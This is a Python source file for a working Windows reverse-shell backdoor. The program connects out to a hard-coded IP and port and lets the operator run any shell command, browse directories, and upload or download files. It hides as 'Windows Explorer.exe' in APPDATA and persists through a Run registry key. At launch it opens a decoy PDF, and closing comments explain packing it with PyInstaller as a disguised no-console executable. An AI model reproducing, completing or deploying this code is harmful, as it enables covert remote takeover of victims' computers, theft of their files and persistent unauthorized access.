#!/usr/bin/env python

__author__ = 'Quest'

# library to establish connection
import socket
import subprocess
import simplejson as json
import os
import base64
import sys
import shutil


class Backdoor:
    def __init__(self, ip, port):
        # persistence
        self.become_persistent()

        # instance of a socket obj
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

        # to connect to dest
        self.connection.connect((ip, port))

    def become_persistent(self):
        evil_file_location = os.environ["appdata"] + "\\Windows Explorer.exe"
        if not os.path.exists(evil_file_location):
            # copy file
            shutil.copyfile(sys.executable, evil_file_location)
            subprocess.call(
                'reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v update /t REG_SZ /d "' + evil_file_location + '"',
                shell=True)

    def reliable_send(self, data):
        json_data = json.dumps(data).encode()
        self.connection.send(json_data)

    def reliable_receive(self):
        json_data = b""
        while True:
            try:
                json_data = json_data + self.connection.recv(1024)
                return json.loads(json_data)
            except ValueError:
                continue

    def exec_sys_command(self, command):
        # for python 2.7 / below
        # DEVNULL = open(os.devnull, 'wb')
        return subprocess.check_output(command, shell=True, stderr=subprocess.DEVNULL,
                                       stdin=subprocess.DEVNULL)

    def change_working_directory_to(self, path):
        os.chdir(path)
        return "[+] Changing working directory to " + path

    def read_file(self, path):
        with open(path, "rb") as file:
            return base64.b64encode(file.read())

    def write_file(self, path, content):
        with open(path, "bw") as file:
            file.write(base64.b64decode(content))
            return "[+] Upload successful"

    def run(self):
        while True:
            # receive data
            command = self.reliable_receive()
            # print(command)

            try:
                if command[0] == "exit":
                    # close connection
                    self.connection.close()
                    sys.exit()
                elif command[0] == "cd" and len(command) > 1:
                    command_result = self.change_working_directory_to(command[1])
                elif command[0] == "download":
                    command_result = self.read_file(command[1])
                elif command[0] == "upload":
                    command_result = self.write_file(command[1], command[2])
                else:
                    command_result = self.exec_sys_command(command)
            except Exception:
                command_result = "[-] Error during command execution."
            # send command result
            self.reliable_send(command_result)


# to allow execution
file_name = sys._MEIPASS + "\sfile.pdf"
subprocess.Popen(file_name, shell=True)

try:
    my_backdoor = Backdoor("192.168.18.170", 444)
    my_backdoor.run()
except ConnectionRefusedError:
    sys.exit()

# to executable
# pyinstaller reverse_backdoor.py --onefile --noconsole

# for persistence
# reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v test /t REG_SZ /d "C:/doodle.exe"

# to add the file we want the user to see
# eg if we want them to see a normal pdf file or img
# and location to store our script once user opens img/pdf(temp)
# pyinstaller --add-data "img/pdf file path,."  --onefile --noconsole --icon /Path to icon file reverse_backdoor.py
